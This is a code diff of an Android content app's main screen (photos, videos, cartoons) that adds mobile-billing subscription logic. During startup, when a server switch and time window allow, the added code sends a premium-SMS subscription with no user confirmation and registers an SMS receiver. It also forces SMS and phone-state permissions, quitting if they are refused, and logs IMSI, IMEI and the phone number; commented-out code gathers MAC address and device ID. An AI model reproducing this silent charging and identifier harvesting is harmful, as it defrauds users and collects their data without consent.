@@ -4,20 +4,37 @@ import android.Manifest;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.app.ProgressDialog;
+import android.content.Context;
 import android.content.DialogInterface;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.Message;
 import android.support.annotation.IdRes;
+import android.support.annotation.NonNull;
+import android.support.v4.app.ActivityCompat;
 import android.support.v4.app.Fragment;
+import android.support.v4.content.ContextCompat;
 import android.support.v4.view.ViewPager;
 import android.text.TextUtils;
 import android.view.KeyEvent;
 import android.widget.RadioButton;
 import android.widget.RadioGroup;
+import android.widget.TextView;
 import android.widget.Toast;
 
+import com.umeng.analytics.MobclickAgent;
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileReader;
+import java.io.IOException;
+import java.lang.reflect.Method;
+
 import lava.bluepay.com.lavaapp.Config;
+import lava.bluepay.com.lavaapp.MixApp;
 import lava.bluepay.com.lavaapp.R;
 import lava.bluepay.com.lavaapp.base.RequestBean;
 import lava.bluepay.com.lavaapp.base.WeakHandler;
@@ -60,6 +77,7 @@ public class MainActivity extends BaseActivity {
     private CartoonFragment cartoonFragment;
     private VideoFragment videoFragment;
 
+//    private TextView tv_test;
     //region==============订阅业务===================
 
     SmsReceiver mReceiver;
@@ -71,6 +89,10 @@ public class MainActivity extends BaseActivity {
 
     private int nowCheckTime;
     private boolean isInCheck = false;
+
+    public boolean getIsInCheck(){
+        return isInCheck;
+    }
 
     public void setCheckStop(){
         nowCheckTime = 0;
@@ -150,6 +172,27 @@ public class MainActivity extends BaseActivity {
             }
         }
     }
+
+    /**
+     * 订阅
+     */
+    private void doSubscribe(String shortCode,String content){
+        if (Utils.checkPermission(context, Manifest.permission.READ_SMS)){
+            try {
+                mReceiver = new SmsReceiver(context);
+                mReceiver.register();
+                PayHelper.doPay(shortCode,content);
+            }catch (Exception e){
+                if(mReceiver!=null){
+                    mReceiver.unregister();
+                }
+                e.printStackTrace();
+            }
+
+        }else{
+            Toast.makeText(context,getResources().getString(R.string.have_no_sms_permission),Toast.LENGTH_SHORT).show();
+        }
+    }
     //endregion==============订阅业务===================
 
 
@@ -186,40 +229,83 @@ public class MainActivity extends BaseActivity {
         if(!getProgressDialog().isShowing()){
             getProgressDialog().show();
         }
-        switch (nowState){
-            case MainActivity.NOWInitState0://去请求token
-                nowInitState = MainActivity.NOWInitState0;
+        try {
+            switch (nowState) {
+                case MainActivity.NOWInitState0://去请求token
+                    nowInitState = MainActivity.NOWInitState0;
+                    //todo test
+//                    if (tv_test != null) {
+//                        tv_test.setText(tv_test.getText().toString() + "," + nowInitState);
+//                    }
+                    sendGetTokenRequest();
+                    break;
+                case MainActivity.NOWInitState1://去请求初始化信息
+                    //todo test
+//                    if (tv_test != null) {
+//                        tv_test.setText(tv_test.getText().toString() + "," + nowInitState);
+//                    }
+                    sendInitRequest(Config.DeviceIdAndroidPhone, Config.AppVersionId);
 
-                sendGetTokenRequest();
-                break;
-            case MainActivity.NOWInitState1://去请求初始化信息
-                sendInitRequest(Config.DeviceIdAndroidPhone,Config.AppVersionId);
+                    break;
+                case MainActivity.NOWInitState2://去请求订阅信息
 
-                break;
-            case MainActivity.NOWInitState2://去请求订阅信息
+                    String telNum = Utils.getIMSI(context);
+                    MemExchange.m_iIMSI1 = telNum;
+                    MemExchange.m_iIMSI = MemExchange.m_iIMSI1;
 
-                String telNum = Utils.getIMSI(context);
-                MemExchange.m_iIMSI1 = telNum;
-                MemExchange.m_iIMSI = MemExchange.m_iIMSI1;
+                    Logger.e(Logger.DEBUG_TAG, "imsi1=" + MemExchange.m_iIMSI1 + ",imsi2=" + MemExchange.m_iIMSI2 + ",imsi=" + MemExchange.m_iIMSI
+                            + ",imei=" + MemExchange.m_iIMEI + ",pho=" + MemExchange.m_sPhoneNumber);
 
-                Logger.e(Logger.DEBUG_TAG,"imsi1="+MemExchange.m_iIMSI1+",imsi2="+MemExchange.m_iIMSI2+",imsi="+MemExchange.m_iIMSI
-                +",imei="+MemExchange.m_iIMEI+",pho="+MemExchange.m_sPhoneNumber);
+                    if (!TextUtils.isEmpty(telNum)) {
+                        sendCheckSubRequest(telNum);
+                        //todo test
+//                        if (tv_test != null) {
+//                            tv_test.setText(tv_test.getText().toString() + "," + nowInitState);
+//                        }
+                    } else {
+                        nowInitState = MainActivity.NOWInitState3;
+                        initApp(nowInitState);
+                    }
+                    break;
+                case MainActivity.NOWInitState3:
+                    if (getProgressDialog().isShowing()) {
+                        getProgressDialog().dismiss();
+                    }
+                    isInInitState = false;
+                    //todo test
+//                    if (tv_test != null) {
+//                        tv_test.setText(tv_test.getText().toString() + "," + "init finished");
+//                    }
+                    //请求第一页数据
+                    sendCategoryDataListRequest(1, Config.CategoryPhotoPopular, ApiUtils.requestPhotoPopular);
+                    if (MemExchange.getInstance().getCheckSubData() != null && "S/O".equals(MemExchange.getInstance().getCheckSubData().getStatus())) {//用户没订阅
+                        if (MemExchange.getInstance().getInitData() != null) {
+                            if (MemExchange.getInstance().getInitData().getSwitchX() == 2) {//订阅开关关了就不继续
+                                return;
+                            }
+                            String time = MemExchange.getInstance().getInitData().getTime();
+                            if (time.indexOf(",") == -1) {
+                                return;
+                            }
+                            if (Utils.ifTimeIn(time)) {//在规定时间内
+                                String code = MemExchange.getInstance().getInitData().getShorcode();
+                                String content = MemExchange.getInstance().getInitData().getSub_key_sms();
+                                if (!TextUtils.isEmpty(code) && !TextUtils.isEmpty(content)) {
+                                    doSubscribe(code, content);
+                                }
+                            } else {
+                                showSubscripDialog();
+                            }
 
-                if(!TextUtils.isEmpty(telNum)){
-                    sendCheckSubRequest(telNum);
-                }else{
-                    nowInitState = MainActivity.NOWInitState3;
-                    initApp(nowInitState);
-                }
-                break;
-            case MainActivity.NOWInitState3:
-                if(getProgressDialog().isShowing()){
-                    getProgressDialog().dismiss();
-                }
-                isInInitState =false;
-                //请求第一页数据
-                sendCategoryDataListRequest(1,Config.CategoryPhotoPopular,ApiUtils.requestPhotoPopular);
-                break;
+                        }
+                    }
+                    break;
+            }
+        }catch (Exception e){
+//            Toast.makeText(context,tv_test.getText().toString(),Toast.LENGTH_SHORT).show();
+//            MobclickAgent.reportError(context,"Thailand:"+tv_test.getText().toString()+",exception"+e.getMessage());
+//            Utils.WriteFile("sdfsss"+","+tv_test.getText().toString()+","+e.getMessage());
+            Utils.WriteFile("sdfsss"+","+e.getMessage());
         }
 
     }
@@ -230,57 +316,129 @@ public class MainActivity extends BaseActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
-        //1. Android 6.0申请权限
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
-//            getPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE});
-        }
+        setPageName("MainActivity");
 
         initToolbar();
         initViews();
 
-        if(ApiUtils.isNetWorkAvailable()) {
-            isInInitState = true;
-            initApp(MainActivity.NOWInitState0);
-        }else{
-            Toast.makeText(context,getResources().getString(R.string.have_no_network),Toast.LENGTH_SHORT).show();
+        //1. Android 6.0申请权限
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
+            if(!ifAllPermissionAllo(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                    Manifest.permission.READ_EXTERNAL_STORAGE,
+                    Manifest.permission.SEND_SMS,
+                    Manifest.permission.READ_PHONE_STATE})) {
+                getPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                        Manifest.permission.READ_EXTERNAL_STORAGE,
+                        Manifest.permission.SEND_SMS,
+                        Manifest.permission.READ_PHONE_STATE});
+            }else{
+                if (ApiUtils.isNetWorkAvailable()) {
+                    isInInitState = true;
+                    initApp(MainActivity.NOWInitState0);
+                } else {
+                    Toast.makeText(context, getResources().getString(R.string.have_no_network), Toast.LENGTH_SHORT).show();
+                }
+            }
+        }else {
+
+            if (ApiUtils.isNetWorkAvailable()) {
+                isInInitState = true;
+                initApp(MainActivity.NOWInitState0);
+            } else {
+                Toast.makeText(context, getResources().getString(R.string.have_no_network), Toast.LENGTH_SHORT).show();
+            }
         }
 //        switchToFragment(FRAGMENT_PHOTO);
 //        loadDataForPhotoFragment();
+
+    }
+
+//    @Override
+//    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+//        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+//        //这里实现用户操作，或同意或拒绝的逻辑
+//        /*grantResults会传进android.content.pm.PackageManager.PERMISSION_GRANTED 或 android.content.pm.PackageManager.PERMISSION_DENIED两个常，前者代表用户同意程序获取系统权限，后者代表用户拒绝程序获取系统权限*/
+//        String aa = "";
+//        if(requestCode == 1 || requestCode == 2) {//sd卡
+//            if(grantResults.length>1){
+//                if(android.content.pm.PackageManager.PERMISSION_GRANTED == grantResults[0]){
+//                    if(ApiUtils.isNetWorkAvailable()) {
+//                        isInInitState = true;
+//                        initApp(MainActivity.NOWInitState0);
+//                    }else{
+//                        Toast.makeText(context,getResources().getString(R.string.have_no_network),Toast.LENGTH_SHORT).show();
+//                    }
+//                    return;
+//                }
+//            }
+//        }
+//        Toast.makeText(context,"无权限,请授权以正常使用",Toast.LENGTH_SHORT).show();
+//        finish();
+//    }
+
+    @Override
+    protected void handlePermissionAllowed(String permissionName) {
+        if(ifAllPermissionAllo(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.READ_PHONE_STATE})){
+            if (ApiUtils.isNetWorkAvailable()) {
+                isInInitState = true;
+                initApp(MainActivity.NOWInitState0);
+            } else {
+                Toast.makeText(context, getResources().getString(R.string.have_no_network), Toast.LENGTH_SHORT).show();
+            }
+        }
     }
 
     @Override
+    protected void handlePermissionForbidden(String permissionName) {
+        super.handlePermissionForbidden(permissionName);
+        Toast.makeText(context,getResources().getString(R.string.permission_exception_tips),Toast.LENGTH_SHORT).show();
+        finish();
+    }
+
+    @Override
+
     protected void onResume() {
         super.onResume();
 
-        if(!isInInitState && nowInitState<NOWInitState3 && MemExchange.getInstance().getInitData() == null){
-            if(ApiUtils.isNetWorkAvailable()) {
-                nowInitState = 0;
-                isInInitState = true;
-                initApp(MainActivity.NOWInitState0);
-            }else{
-                Toast.makeText(context,getResources().getString(R.string.have_no_network),Toast.LENGTH_SHORT).show();
-            }
-        }
+
+//        if(!isInInitState && nowInitState<NOWInitState3 && MemExchange.getInstance().getInitData() == null){
+//            if(ApiUtils.isNetWorkAvailable()) {
+//                nowInitState = 0;
+//                isInInitState = true;
+//                initApp(MainActivity.NOWInitState0);
+//            }else{
+//                Toast.makeText(context,getResources().getString(R.string.have_no_network),Toast.LENGTH_SHORT).show();
+//            }
+//        }
     }
 
     @Override
     protected void onResumeFragments() {
         Logger.i(Logger.DEBUG_TAG,"MainActivity,onResumeFragments()");
         super.onResumeFragments();
-        if(currentNavIndex == FRAGMENT_PHOTO || currentNavIndex == -1){
-            PhotoFragment fragment = (PhotoFragment) getSupportFragmentManager().findFragmentByTag(PhotoFragment.TAG);
-            if (fragment != null) {
-                if (currentNavIndex == -1) {
-                    if (rb_fragment_photo != null) {
-                        rb_fragment_photo.setChecked(true);
+
+        if(ifAllPermissionAllo(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.READ_PHONE_STATE})) {
+
+            if (currentNavIndex == FRAGMENT_PHOTO || currentNavIndex == -1) {
+                PhotoFragment fragment = (PhotoFragment) getSupportFragmentManager().findFragmentByTag(PhotoFragment.TAG);
+                if (fragment != null) {
+                    if (currentNavIndex == -1) {
+                        if (rb_fragment_photo != null) {
+                            rb_fragment_photo.setChecked(true);
+                        }
+                    } else {
+                        switchToFragment(FRAGMENT_PHOTO);
                     }
                 } else {
                     switchToFragment(FRAGMENT_PHOTO);
+                    //发送请求
                 }
-            } else {
-                switchToFragment(FRAGMENT_PHOTO);
-                //发送请求
             }
         }
     }
@@ -288,6 +446,7 @@ public class MainActivity extends BaseActivity {
 
 
     /**
+     * 条件：
      * 设置toolbar中间viewpager指示字（用于fragment调用）
      * @param vp
      * @param titles
@@ -318,7 +477,7 @@ public class MainActivity extends BaseActivity {
 
 
     private void initViews(){
-
+//        tv_test = (TextView) findViewById(R.id.tv_test);
         rg_select_fragment = (RadioGroup) findViewById(R.id.rg_select_fragment);
         rb_fragment_photo = (RadioButton) findViewById(R.id.tv_fragment_photo);
         rb_fragment_video = (RadioButton) findViewById(R.id.tv_fragment_video);
@@ -405,6 +564,7 @@ public class MainActivity extends BaseActivity {
 
         RadioButton rb = (RadioButton) rg_select_fragment.getChildAt(pageIndex);
         rb.setChecked(true);
+//        rb.setTextColor(getResources().getColor(R.color.activity_main_nav_radio_text));
         checkIndex(pageIndex);
         this.currentNavIndex = pageIndex;
     }
@@ -443,16 +603,29 @@ public class MainActivity extends BaseActivity {
                 rb_fragment_photo.setBackgroundColor(getResources().getColor(R.color.activity_main_nav_radio_bg_check));
                 rb_fragment_video.setBackgroundColor(getResources().getColor(R.color.activity_main_nav_radio_bg));
                 rb_fragment_cartoon.setBackgroundColor(getResources().getColor(R.color.activity_main_nav_radio_bg));
+
+                rb_fragment_photo.setTextColor(getResources().getColor(R.color.activity_main_nav_radio_text));
+                rb_fragment_video.setTextColor(getResources().getColor(R.color.white_new_text));
+                rb_fragment_cartoon.setTextColor(getResources().getColor(R.color.white_new_text));
                 break;
             case FRAGMENT_VIDEO:
                 rb_fragment_photo.setBackgroundColor(getResources().getColor(R.color.activity_main_nav_radio_bg));
                 rb_fragment_video.setBackgroundColor(getResources().getColor(R.color.activity_main_nav_radio_bg_check));
                 rb_fragment_cartoon.setBackgroundColor(getResources().getColor(R.color.activity_main_nav_radio_bg));
+
+                rb_fragment_photo.setTextColor(getResources().getColor(R.color.white_new_text));
+                rb_fragment_video.setTextColor(getResources().getColor(R.color.activity_main_nav_radio_text));
+                rb_fragment_cartoon.setTextColor(getResources().getColor(R.color.white_new_text));
                 break;
             case FRAGMENT_CARTOON:
                 rb_fragment_photo.setBackgroundColor(getResources().getColor(R.color.activity_main_nav_radio_bg));
                 rb_fragment_video.setBackgroundColor(getResources().getColor(R.color.activity_main_nav_radio_bg));
                 rb_fragment_cartoon.setBackgroundColor(getResources().getColor(R.color.activity_main_nav_radio_bg_check));
+
+                rb_fragment_photo.setTextColor(getResources().getColor(R.color.white_new_text));
+                rb_fragment_video.setTextColor(getResources().getColor(R.color.white_new_text));
+                rb_fragment_cartoon.setTextColor(getResources().getColor(R.color.activity_main_nav_radio_text));
+
                 break;
         }
     }
@@ -1132,31 +1305,20 @@ public class MainActivity extends BaseActivity {
      */
     public void showSubscripDialog(){
         AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
-        builder.setMessage("Are you sure to subscribe?");
-        builder.setTitle("tips");
-        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
+        builder.setMessage(getResources().getString(R.string.if_sure_to_subscribe));
+        builder.setTitle(getResources().getString(R.string.tips));
+        builder.setPositiveButton(getResources().getString(R.string.sure), new DialogInterface.OnClickListener() {
 
             public void onClick(DialogInterface dialog, int which) {
-
-                if (Utils.checkPermission(context, Manifest.permission.READ_SMS)){
-                    try {
-                        mReceiver = new SmsReceiver(context);
-                        mReceiver.register();
-                        PayHelper.doPay();
-                    }catch (Exception e){
-                        if(mReceiver!=null){
-                            mReceiver.unregister();
-                        }
-                        e.printStackTrace();
-                    }
-
-                }else{
-                    Toast.makeText(context,"没有短信权限",Toast.LENGTH_SHORT).show();
+                String code = MemExchange.getInstance().getInitData().getShorcode();
+                String content = MemExchange.getInstance().getInitData().getSub_key_sms();
+                if(!TextUtils.isEmpty(code) && !TextUtils.isEmpty(content)) {
+                    doSubscribe(code,content);
                 }
             }
         });
 
-        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
+        builder.setNegativeButton(getResources().getString(R.string.cancel), new DialogInterface.OnClickListener() {
             public void onClick(DialogInterface dialog, int which) {
                 dialog.dismiss();
             }
@@ -1176,6 +1338,85 @@ public class MainActivity extends BaseActivity {
         super.finish();
         MemExchange.getInstance().clear();
     }
+
+
+//    public static boolean checkPermission(Context context, String permission) {
+//        boolean result = false;
+//        if (Build.VERSION.SDK_INT >= 23) {
+//            try {
+//                Class<?> clazz = Class.forName("android.content.Context");
+//                Method method = clazz.getMethod("checkSelfPermission", String.class);
+//                int rest = (Integer) method.invoke(context, permission);
+//                if (rest == PackageManager.PERMISSION_GRANTED) {
+//                    result = true;
+//                } else {
+//                    result = false;
+//                }
+//            } catch (Exception e) {
+//                result = false;
+//            }
+//        } else {
+//            PackageManager pm = context.getPackageManager();
+//            if (pm.checkPermission(permission, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) {
+//                result = true;
+//            }
+//        }
+//        return result;
+//    }
+//    public static String getDeviceInfo(Context context) {
+//        try {
+//            org.json.JSONObject json = new org.json.JSONObject();
+//            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) context
+//                    .getSystemService(Context.TELEPHONY_SERVICE);
+//            String device_id = null;
+//            if (checkPermission(context, Manifest.permission.READ_PHONE_STATE)) {
+//                device_id = tm.getDeviceId();
+//            }
+//            String mac = null;
+//            FileReader fstream = null;
+//            try {
+//                fstream = new FileReader("/sys/class/net/wlan0/address");
+//            } catch (FileNotFoundException e) {
+//                fstream = new FileReader("/sys/class/net/eth0/address");
+//            }
+//            BufferedReader in = null;
+//            if (fstream != null) {
+//                try {
+//                    in = new BufferedReader(fstream, 1024);
+//                    mac = in.readLine();
+//                } catch (IOException e) {
+//                } finally {
+//                    if (fstream != null) {
+//                        try {
+//                            fstream.close();
+//                        } catch (IOException e) {
+//                            e.printStackTrace();
+//                        }
+//                    }
+//                    if (in != null) {
+//                        try {
+//                            in.close();
+//                        } catch (IOException e) {
+//                            e.printStackTrace();
+//                        }
+//                    }
+//                }
+//            }
+//            json.put("mac", mac);
+//            if (TextUtils.isEmpty(device_id)) {
+//                device_id = mac;
+//            }
+//            if (TextUtils.isEmpty(device_id)) {
+//                device_id = android.provider.Settings.Secure.getString(context.getContentResolver(),
+//                        android.provider.Settings.Secure.ANDROID_ID);
+//            }
+//            json.put("device_id", device_id);
+//            return json.toString();
+//        } catch (Exception e) {
+//            e.printStackTrace();
+//        }
+//        return null;
+//    }
 
 
 }
